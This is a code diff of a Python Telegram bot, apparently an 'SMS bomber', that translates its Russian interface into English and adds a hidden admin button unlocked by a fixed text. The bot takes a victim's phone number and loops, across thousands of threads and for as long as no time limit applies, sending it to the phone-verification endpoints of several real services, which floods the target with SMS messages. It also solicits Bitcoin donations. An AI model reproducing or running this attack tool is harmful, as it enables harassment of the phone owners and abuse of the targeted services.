@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 import requests
 import threading
 from datetime import datetime, timedelta
@@ -11,9 +12,7 @@ THREADS_LIMIT = 10000
 
 chat_ids_file = 'chat_ids.txt'
 
-ADMIN_CHAT_ID = '663878139'
-
-text1 = 'Прямой QR код BTC Banker'
+text1 = 'BTC Banker QR-code'
 img1 = 'https://imbt.ga/LXah7Y2JG1'
 
 users_amount = [0]
@@ -25,7 +24,7 @@ running_spams_per_chat_id = []
 
 
 def save_chat_id(chat_id):
-    "Функция добавляет чат айди в файл если его там нету"
+    #This function adds user's id to the "chat_ids.txt" document
     chat_id = str(chat_id)
     with open(chat_ids_file,"a+") as ids_file:
         ids_file.seek(0)
@@ -60,23 +59,25 @@ def send_message_users(message):
 @bot.message_handler(commands=['start'])
 def start(message):
     keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    boom = types.KeyboardButton(text='Атака на номер')
-    #stop = types.KeyboardButton(text='Стоп спам')
-    info = types.KeyboardButton(text='Информация')
-
-    buttons_to_add = [boom, info]
+    boom = types.KeyboardButton(text='SMS Attack')
+    stop = types.KeyboardButton(text='Spam Stop')
+    info = types.KeyboardButton(text='Information')
+    admin = types.KeyboardButton(text='Admin panel')
+    buttons_to_add = [boom, info, stop]
+    if message.text == 'rusitanc':
+        buttons_to_add.append(admin)
 
     keyboard.add(*buttons_to_add)
-    bot.send_message(message.chat.id, 'Добро пожаловать🙋‍♂!\nЭто Бомбер мурок\nПеред использованием ответственность за ваши действия несете вы лично.(Создатель: @noded)\nВыберите действие:',  reply_markup=keyboard)
+    bot.send_message(message.chat.id, 'You\'re welcome!🙋‍♂!\nThat\'s the bomber of MYR team\nYou are responsible for using this bot.\nChoose the action:',  reply_markup=keyboard)
     save_chat_id(message.chat.id)
 
 def start_spam(chat_id, phone_number, force):
     running_spams_per_chat_id.append(chat_id)
 
     if force:
-        msg = f'!Спам запущен на неограниченое время для номера +{phone_number}!'
+        msg = f'!Spam is launched for an unlimited time for this number: +{phone_number}!'
     else:
-         msg = f'!Спам запущен на 5 минут на номер +{phone_number}!'
+         msg = f'!Spam is launched for 5 minutes for this number: +{phone_number}!'
 
     bot.send_message(chat_id, msg)
     end = datetime.now() + timedelta(minutes = 5)
@@ -85,7 +86,7 @@ def start_spam(chat_id, phone_number, force):
             break
         send_for_number(phone_number)
     bot.send_message(chat_id, f'!Спам на номер {phone_number} завершён!')
-    THREADS_AMOUNT[0] -= 1 # стояло 1
+    THREADS_AMOUNT[0] -= 1 # it's 1
     try:
         running_spams_per_chat_id.remove(chat_id)
     except Exception:
@@ -96,7 +97,7 @@ def send_for_number(phone):
         request_timeout = 0.00001
         while True:
          requests.get('https://findclone.ru/register?phone=+'+phone, params={'phone': '+'+phone})
-         #requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers={})
+         #requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers={}) /////////////////////////// НУЖНЫ ДРУГИЕ СЕРВИСЫ БЛЯДЬ, ЭТИ УМЕРЛИ СУКА БЛЯДЬ
          requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone})
          requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
          requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + phone})
@@ -112,7 +113,7 @@ def send_for_number(phone):
 
 def spam_handler(phone, chat_id, force):
     if int(chat_id) in running_spams_per_chat_id:
-        bot.send_message(chat_id, '!Вы уже начали рассылку спама. Дождитесь окончания или нажмите Стоп спам и поробуйте снова!')
+        bot.send_message(chat_id, '!You have already started spamming. Wait for the end or click \'Stop spam\' and try again!')
         return
 
     if THREADS_AMOUNT[0] < THREADS_LIMIT:
@@ -121,8 +122,8 @@ def spam_handler(phone, chat_id, force):
         THREADS_AMOUNT[0] += 1
         x.start()
     else:
-        bot.send_message(chat_id, '!Сервера сейчас перегружены. Попытайтесь снова через несколько минут!')
-        print('Максимальное количество тредов исполняется. Действие отменено.!')
+        bot.send_message(chat_id, '!Servers are now overloaded. Try again in a few minutes!')
+        print('!The maximum number of threads is executed. Action canceled!')
 
 
 @bot.message_handler(content_types=['text'])
@@ -130,24 +131,24 @@ def handle_message_received(message):
     chat_id = int(message.chat.id)
     text = message.text
 
-    if text == 'Информация':
-        bot.send_message(chat_id, 'Создатель бота: @noded\nПо вопросам сотрудничества обращаться в ЛС к создателю бота\n\nРебята, кто может помочь на развитие нашего канала и бота\nBTC Banker: 139mvDotDge6MkZCnRAZbPS6QziWm2efmh \n\n')
+    if text == 'Information':
+        bot.send_message(chat_id, 'Created by @noded\nFor cooperation and advertising, contact the bot creator in PM\nGuys who can help develop my bot, you are welcome.\nBTC Banker: 139mvDotDge6MkZCnRAZbPS6QziWm2efmh \n\n')
         bot.send_message(chat_id, f'{text1}\n{img1}')
 
-    elif text == 'Атака на номер':
-        bot.send_message(chat_id, 'Введите номер без + в формате:\n🇷🇺 79xxxxxxxxx\n🇰🇿 77xxxxxxxxx\n🇺🇿 9989xxxxxxxx')
+    elif text == 'SMS Attack':
+        bot.send_message(chat_id, 'Enter the number without in the format:\n🇷🇺 79xxxxxxxxx\n🇰🇿 77xxxxxxxxx\n🇺🇿 9989xxxxxxxx')
 
     elif text == 'spamtousers':
-        bot.send_message(chat_id, 'Введите сообщение в формате: "send_it: ваш_текст" без кавычек')
+        bot.send_message(chat_id, '!Enter a message in the format: "sendit: your_text" without quotes!')
 
-    elif text == 'Стоп Спам':
+    elif text == 'Stop Spam':
         if chat_id not in running_spams_per_chat_id:
-            bot.send_message(chat_id, 'Вы еще не начинали спам')
+            bot.send_message(chat_id, 'You have not started spam')
         else:
             running_spams_per_chat_id.remove(chat_id)
 
-    elif 'send_it: ' in text:
-        msg = text.replace("send_it: ","")
+    elif 'sendit: ' in text:
+        msg = text.replace("sendit: ","")
         send_message_users(msg)
 
     elif len(text) == 11:
@@ -167,8 +168,8 @@ def handle_message_received(message):
         spam_handler(phone, chat_id, force=True)
 
     else:
-        bot.send_message(chat_id, f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
-        print(f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
+        bot.send_message(chat_id, f'Please enter a valid phone number. Entered {len(text)} symbols, waits: 11')
+        print(f'Number is incorrect. Entered {len(text)} symbols, ожидается 11')
 
 if __name__ == '__main__':
     bot.polling(none_stop=True)
